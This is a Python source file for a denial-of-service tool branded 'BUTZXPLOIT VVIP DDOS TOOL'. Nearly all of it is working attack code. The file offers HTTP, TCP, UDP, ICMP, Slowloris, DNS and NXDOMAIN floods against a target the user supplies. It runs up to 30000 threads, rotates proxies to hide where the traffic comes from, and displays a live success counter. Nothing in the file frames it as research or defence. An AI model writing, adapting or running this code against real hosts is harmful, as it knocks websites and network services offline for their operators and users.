import os, sys, socket, threading, time, random, subprocess, asyncio, httpx
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from colorama import Fore, init

init(autoreset=True)
console = Console()

# ===== PASSWORD LOGIN =====
PASSWORD = "0"
attempt = console.input("[yellow]Enter Password: [/yellow] ")
if attempt != PASSWORD:
    console.print("[red]Incorrect password! Exiting...[/red]")
    exit()

# ===== Load Proxy =====
proxy_file = "ips.txt"
if os.path.exists(proxy_file):
    with open(proxy_file, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
else:
    proxies = []

def get_proxy():
    return random.choice(proxies) if proxies else None

# ===== Status Logging =====
class AttackStatus:
    def __init__(self):
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()

    def update(self, success=True):
        with self.lock:
            if success: self.sent += 1
            else: self.failed += 1

    def report(self):
        total = self.sent + self.failed
        rate = (self.sent / total * 100) if total>0 else 0
        return f"[cyan]Sent:[/] {self.sent} | [red]Failed:[/] {self.failed} | [green]Rate:[/] {rate:.2f}%"

# ===== PING CHECK =====
def ping_check(target):
    try:
        result = subprocess.run(["ping", "-c", "1", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except:
        return False

# ===== HTTP FLOOD =====
async def http_flood(target, status):
    proxy = get_proxy()
    async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=3) as client:
        while True:
            try:
                headers = {"User-Agent": f"Mozilla/5.0 {random.randint(1000,9999)}"}
                await client.get(target, headers=headers)
                status.update(True)
            except:
                status.update(False)
            await asyncio.sleep(0)

# ===== TCP FLOOD =====
def tcp_flood(target_ip, port, status):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
            status.update(True)
        except:
            status.update(False)

# ===== UDP FLOOD =====
def udp_flood(target_ip, port, status):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(random._urandom(1024), (target_ip, port))
            status.update(True)
        except:
            status.update(False)

# ===== ICMP FLOOD =====
def icmp_flood(target_ip, status):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b"\x08\x00" + b"X"*64, (target_ip,0))
            status.update(True)
        except:
            status.update(False)

# ===== SLOWLORIS =====
def slowloris(target_ip, port, status):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            while True:
                s.send(b"X-a: b\r\n")
                time.sleep(15)
        except:
            status.update(False)

# ===== DNS FLOOD =====
def dns_flood(target_ip, status):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            req = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x05hello\x03com\x00\x00\x01\x00\x01"
            sock.sendto(req, (target_ip, 53))
            status.update(True)
        except:
            status.update(False)

# ===== NXDOMAIN ATTACK =====
def nxdomain_attack(target_ip, status):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            req = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03xyz\x05dummy\x03com\x00\x00\x01\x00\x01"
            sock.sendto(req, (target_ip, 53))
            status.update(True)
        except:
            status.update(False)

# ===== MONITOR =====
def monitor(status):
    with Progress() as progress:
        task = progress.add_task("[green]Attack running...", total=None)
        while True:
            progress.update(task, description=status.report())
            time.sleep(1)

# ===== MAIN =====
def main():
    os.system("clear")
    console.print(Panel.fit("🚀 [bold red]BUTZXPLOIT VVIP DDOS TOOL[/bold red]", style="bold green"))

    target = console.input("[yellow]Enter Target IP/Domain: [/yellow]").strip()
    if not ping_check(target):
        console.print("[red]Target is inactive! Exiting...[/red]")
        return
    port = int(console.input("[yellow]Enter Port: [/yellow]"))
    console.print("[cyan]Select Method:\n1) HTTP\n2) TCP\n3) UDP\n4) ICMP\n5) Slowloris\n6) DNS\n7) NXDOMAIN[/cyan]")
    method = console.input("[yellow]Choice: [/yellow]").strip()
    threads = int(console.input("[yellow]Threads (Max 30000): [/yellow]"))
    threads = min(threads,30000)

    status = AttackStatus()
    threading.Thread(target=monitor, args=(status,), daemon=True).start()

    if method=="1":
        loop = asyncio.get_event_loop()
        for _ in range(threads):
            loop.create_task(http_flood(target, status))
        loop.run_forever()
    else:
        funcs = {
            "2": tcp_flood,
            "3": udp_flood,
            "4": icmp_flood,
            "5": slowloris,
            "6": dns_flood,
            "7": nxdomain_attack
        }
        attack_func = funcs.get(method)
        for _ in range(threads):
            t = threading.Thread(target=attack_func, args=(target, port, status) if method in ["2","3","5"] else (target,status))
            t.start()

if __name__=="__main__":
    main()
